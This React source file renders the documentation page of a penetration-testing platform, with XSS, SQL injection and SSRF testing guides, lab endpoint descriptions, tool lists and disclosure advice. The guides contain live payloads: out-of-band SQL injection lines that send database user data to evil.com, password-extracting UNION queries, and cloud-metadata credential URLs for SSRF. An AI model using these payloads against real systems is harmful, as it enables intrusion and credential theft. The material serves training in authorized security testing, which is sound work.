import { useState } from "react";
import { useLocation } from "wouter";
import { Terminal, ChevronRight, BookOpen, Shield, Code2, Zap, AlertTriangle, ExternalLink } from "lucide-react";
import { Badge } from "@/components/ui/badge";

const DOCS_SECTIONS = [
  {
    id: "intro",
    title: "Introduction",
    icon: <BookOpen className="w-4 h-4" />,
    content: `41M4 is a professional-grade security research platform built for penetration testers, 
red teamers, and bug bounty hunters. It provides a curated database of vulnerability payloads, 
a live attack lab with intentionally vulnerable applications, and a comprehensive API for 
programmatic access.

All payloads in this database are intended exclusively for authorized security testing. 
You must have explicit written permission from the target owner before using any technique 
documented here.`,
  },
  {
    id: "payloads",
    title: "Payload Database",
    icon: <Shield className="w-4 h-4" />,
    content: `The payload database contains hundreds of hand-curated payloads across all major 
vulnerability categories. Each payload includes:

- Category and subcategory classification
- Technical description explaining the mechanism
- WAF bypass classification when applicable
- Platform specificity (MySQL, PHP, Java, etc.)
- CVE references where relevant

SEARCHING
Use the search bar on the home page or the /api/payloads endpoint to search by:
- Free text (matches payload body, title, description)
- Category filter (XSS, SQLi, LFI, SSRF, XXE, RCE, CSRF, IDOR, Open Redirect, SSTI, Command Injection)
- Bypass-only mode

CATEGORIES
XSS — Cross-Site Scripting (reflected, stored, DOM-based, mutation)
SQLi — SQL Injection (UNION, blind, time-based, error-based, OOB)
LFI — Local File Inclusion (path traversal, PHP wrappers, log poisoning)
SSRF — Server-Side Request Forgery (cloud metadata, internal services, protocol bypass)
XXE — XML External Entity injection
RCE — Remote Code Execution (command injection, SSTI, deserialization)
CSRF — Cross-Site Request Forgery
IDOR — Insecure Direct Object References
Open Redirect — URL redirection vulnerabilities`,
  },
  {
    id: "attack-lab",
    title: "Attack Lab",
    icon: <Terminal className="w-4 h-4" />,
    content: `The Attack Lab provides real, intentionally vulnerable web application endpoints 
that you can test payloads against. Unlike sandboxed emulators, these are actual Express.js 
routes with real vulnerability patterns.

AVAILABLE LABS

[XSS Lab]
- /api/lab/xss/reflected — GET ?payload= parameter reflected without encoding
- /api/lab/xss/stored — POST /comment stores and renders comments unescaped (in-memory)
- /api/lab/xss/dom — Client-side DOM-based XSS via location.hash

[SQLi Lab]  
- /api/lab/sqli/search — GET ?q= parameter concatenated into SQL string simulation
  Returns simulated DB results to demonstrate injection anatomy

[CSRF Lab]
- /api/lab/csrf/bank — Simulated bank transfer form with no CSRF protection
  POST /api/lab/csrf/transfer accepts to= and amount= without token validation

[LFI Lab]
- /api/lab/lfi — GET ?file= parameter demonstrates path traversal patterns
  Safe simulation — returns file structure metadata, not real file contents

[SSRF Lab]
- /api/lab/ssrf/fetch — GET ?url= parameter is fetched by a simulated server-side webhook previewer
  Includes internal services, cloud metadata, and canonicalization bypass behavior

[XXE Lab]
- /api/lab/xxe/parse — GET ?xml= parameter is parsed by a simulated legacy XML importer
  Resolves external entities against safe fake files and metadata endpoints

[Progress]
- /api/lab/progress — returns lab progress metadata without requiring user authentication

ETHICAL USAGE
The labs are hosted within this application — you already have permission. Never 
use techniques learned here against external systems without authorization.`,
  },
  {
    id: "xss-guide",
    title: "XSS Testing Guide",
    icon: <Code2 className="w-4 h-4" />,
    content: `Cross-Site Scripting (XSS) occurs when an attacker injects malicious scripts into 
web pages viewed by other users. XSS vulnerabilities are split into three types:

REFLECTED XSS
The malicious payload is part of the request and reflected in the response.
1. Identify input reflection: search for ?q= parameters and form fields
2. Test basic vectors: <script>alert(1)</script>, <img src=x onerror=alert(1)>
3. If filtered, try WAF bypass techniques (encoding, case variation, event handlers)
4. Confirm execution context (HTML body, attribute, JavaScript string, URL)

STORED XSS
The payload persists in the database and is rendered to all visitors.
1. Identify user-generated content (comments, profiles, messages)
2. Submit payload — check if it's stored and rendered unescaped
3. Stored XSS has higher impact — all visitors are affected
4. Test for admin panels — stored XSS visible to admins enables privilege escalation

DOM-BASED XSS
The vulnerability is in client-side JavaScript, not server-side rendering.
1. Enumerate client-side sinks: innerHTML, document.write, eval, location.href
2. Trace data sources: location.hash, location.search, localStorage, postMessage
3. Construct payload that flows from source to sink

COMMON BYPASSES
- HTML entity encoding in attribute context: &#x6F;&#x6E;&#x65;&#x72;&#x72;&#x6F;&#x72;
- SVG context: <svg><script>alert(1)</script></svg>
- Mutation XSS: exploit browser parser differences
- CSP bypass via JSONP, script gadgets, or nonce leakage

IMPACT ESCALATION
Low: alert(document.domain) — proves origin
Medium: document.cookie exfiltration
High: Admin action via XSS + CSRF chain
Critical: Session hijack, account takeover, keylogger`,
  },
  {
    id: "sqli-guide",
    title: "SQLi Testing Guide",
    icon: <Code2 className="w-4 h-4" />,
    content: `SQL Injection allows an attacker to interfere with the queries an application 
makes to its database. Modern testing methodology:

DETECTION
1. Add a single quote (') — look for SQL errors or behavioral changes
2. Add '--  — comment out rest of query and compare response
3. Add OR 1=1 vs OR 1=2 — compare results (boolean-based blind)
4. Add SLEEP(5) — look for response delays (time-based blind)

IDENTIFY THE DATABASE
MySQL: @@version, information_schema
PostgreSQL: version(), pg_sleep()
MSSQL: @@version, WAITFOR DELAY
Oracle: v$version, DBMS_PIPE
SQLite: sqlite_version()

UNION-BASED EXTRACTION
1. Find column count: ' ORDER BY 1-- (increment until error)
2. Find string columns: ' UNION SELECT NULL,NULL-- (replace NULL with 'a')
3. Extract data: ' UNION SELECT username,password FROM users--

BLIND EXTRACTION (Burp Suite / sqlmap)
Boolean: ' AND SUBSTRING(password,1,1)='a'--
Time: ' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--

OUT-OF-BAND
DNS: SELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.evil.com\\\\x'))
HTTP: UTL_HTTP.REQUEST('http://evil.com/?d='||user) [Oracle]

TOOLS
- sqlmap: automated detection and exploitation
- Burp Suite: manual testing with repeater/intruder
- BBQSQL: blind injection framework`,
  },
  {
    id: "ssrf-guide",
    title: "SSRF Testing Guide",
    icon: <Zap className="w-4 h-4" />,
    content: `Server-Side Request Forgery (SSRF) allows an attacker to make the server send 
HTTP requests to internal or external targets.

DETECTION
Look for URL parameters: url=, redirect=, fetch=, src=, path=, load=
Check: PDF generators, image fetchers, webhooks, import from URL features

CLOUD METADATA ENDPOINTS
AWS: http://169.254.169.254/latest/meta-data/
     http://169.254.169.254/latest/meta-data/iam/security-credentials/
GCP: http://metadata.google.internal/computeMetadata/v1/ (add Metadata-Flavor: Google header)
Azure: http://169.254.169.254/metadata/identity/oauth2/token

INTERNAL PORT SCANNING
http://127.0.0.1:6379/ — Redis
http://127.0.0.1:9200/ — Elasticsearch  
http://127.0.0.1:8500/ — Consul
http://127.0.0.1:2375/ — Docker API

BYPASS TECHNIQUES
IPv6: http://[::1]/
Octal: http://0177.0.0.1/
Hex: http://0x7f000001/
DNS rebinding: evil.com → 127.0.0.1 after first lookup
URL parsing bugs: http://evil.com@127.0.0.1/

PROTOCOL SMUGGLING
gopher:// — raw TCP, can target Redis, SMTP, Memcached
dict:// — DICT protocol, useful against Redis
file:// — reads local files

IMPACT
- Cloud credentials → full account takeover
- Internal service access → lateral movement
- RCE via Redis CONFIG SET or gopher → command execution`,
  },
  {
    id: "tools",
    title: "Recommended Tools",
    icon: <Zap className="w-4 h-4" />,
    content: `RECONNAISSANCE
nmap — port scanning and service enumeration
amass — subdomain enumeration
subfinder — passive subdomain discovery
httpx — HTTP probe tool

WEB TESTING
Burp Suite Pro — the industry standard for web testing
OWASP ZAP — open source alternative to Burp
ffuf — fast web fuzzer for directories and parameters
feroxbuster — content discovery

EXPLOITATION
sqlmap — automated SQL injection
XSStrike — advanced XSS scanner
SSRFire — SSRF automation
interactsh — OOB interaction server (like Burp Collaborator)
ysoserial — Java deserialization gadgets
gopherus — gopher:// payload generator for SSRF chains

POST-EXPLOITATION  
metasploit — exploitation framework
impacket — network protocol implementations
bloodhound — Active Directory attack path mapping
mimikatz — credential extraction (Windows)

WORDLISTS
SecLists — the definitive collection (danielmiessler/SecLists)
PayloadsAllTheThings — payload reference (swisskyrepo)
FuzzDB — attack patterns and discovery

API TESTING
Postman — API exploration
Insomnia — REST client
graphql-voyager — GraphQL schema visualization`,
  },
  {
    id: "disclosure",
    title: "Responsible Disclosure",
    icon: <AlertTriangle className="w-4 h-4" />,
    content: `LEGAL REQUIREMENTS
Never test systems without explicit written authorization. Unauthorized testing 
is illegal under the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), 
and equivalent laws worldwide.

DISCLOSURE PROCESS
1. Reproduce and document the vulnerability thoroughly
2. Assess impact — what data/systems are affected?
3. Contact the security team (security.txt, HackerOne, Bugcrowd, email)
4. Provide a clear, reproducible PoC (without weaponizing it)
5. Give reasonable remediation time (typically 90 days per Google Project Zero)
6. Coordinate public disclosure

WRITING A GOOD REPORT
Title: Clear vulnerability type and location
Severity: CVSS score + business impact
Steps to Reproduce: Exact, numbered, reproducible
Impact: What an attacker could accomplish
Remediation: Suggested fix
PoC: Screenshot, video, or curl command

BUG BOUNTY PLATFORMS
HackerOne: hackerone.com
Bugcrowd: bugcrowd.com
Intigriti: intigriti.com
YesWeHack: yeswehack.com
Synack: synack.com (vetted researchers)

CVE RESOURCES
NVD: nvd.nist.gov
MITRE CVE: cve.mitre.org
Exploit-DB: exploit-db.com`,
  },
];

export default function Docs() {
  const [, setLocation] = useLocation();
  const [activeSection, setActiveSection] = useState("intro");

  const section = DOCS_SECTIONS.find(s => s.id === activeSection) ?? DOCS_SECTIONS[0];

  return (
    <div className="min-h-screen bg-background text-foreground font-mono flex flex-col">
      <nav className="border-b border-border/50 p-4 sticky top-0 bg-background/90 backdrop-blur z-50">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <button onClick={() => setLocation("/")} className="text-2xl font-bold tracking-widest text-primary hover:opacity-80">41M4</button>
          <div className="flex gap-4">
            <Badge variant="outline" className="border-primary text-primary rounded-none">DOCS</Badge>
            <button onClick={() => setLocation("/api-reference")} className="text-xs text-muted-foreground hover:text-primary tracking-widest">[API REF]</button>
            <button onClick={() => setLocation("/lab")} className="text-xs text-orange-400 hover:text-orange-300 tracking-widest">[ATTACK BOX]</button>
          </div>
        </div>
      </nav>

      <div className="flex-1 flex max-w-7xl mx-auto w-full">
        {/* Sidebar */}
        <aside className="w-64 border-r border-border/40 p-4 space-y-1 shrink-0 hidden md:block">
          <div className="text-xs text-muted-foreground tracking-widest uppercase mb-4 px-2">Navigation</div>
          {DOCS_SECTIONS.map(s => (
            <button
              key={s.id}
              onClick={() => setActiveSection(s.id)}
              className={`w-full text-left px-3 py-2 text-sm flex items-center gap-2 transition-colors rounded-none ${
                activeSection === s.id
                  ? "bg-primary/15 text-primary border-l-2 border-primary"
                  : "text-muted-foreground hover:text-primary hover:bg-primary/5"
              }`}
            >
              {s.icon}
              {s.title}
              {activeSection === s.id && <ChevronRight className="w-3 h-3 ml-auto" />}
            </button>
          ))}
        </aside>

        {/* Main */}
        <main className="flex-1 p-8 overflow-auto">
          <div className="max-w-3xl">
            <div className="flex items-center gap-3 mb-6">
              <div className="text-primary">{section.icon}</div>
              <h1 className="text-2xl font-bold tracking-wider text-primary uppercase">{section.title}</h1>
            </div>
            <div className="border border-border/40 bg-card p-6">
              <pre className="whitespace-pre-wrap text-sm text-muted-foreground leading-relaxed font-mono">
                {section.content}
              </pre>
            </div>

            {/* Mobile nav */}
            <div className="mt-8 grid grid-cols-2 gap-2 md:hidden">
              {DOCS_SECTIONS.filter(s => s.id !== activeSection).map(s => (
                <button
                  key={s.id}
                  onClick={() => setActiveSection(s.id)}
                  className="text-left p-3 border border-border/40 hover:border-primary/50 text-xs text-muted-foreground hover:text-primary flex items-center gap-2"
                >
                  {s.icon} {s.title}
                </button>
              ))}
            </div>

            <div className="mt-6 flex items-center gap-2 text-xs text-muted-foreground border-t border-border/40 pt-4">
              <ExternalLink className="w-3.5 h-3.5" />
              <span>See also:</span>
              <button onClick={() => setLocation("/api-reference")} className="text-primary hover:underline">[API Reference]</button>
              <span>•</span>
              <button onClick={() => setLocation("/lab")} className="text-orange-400 hover:underline">[Attack Lab]</button>
            </div>
          </div>
        </main>
      </div>
    </div>
  );
}
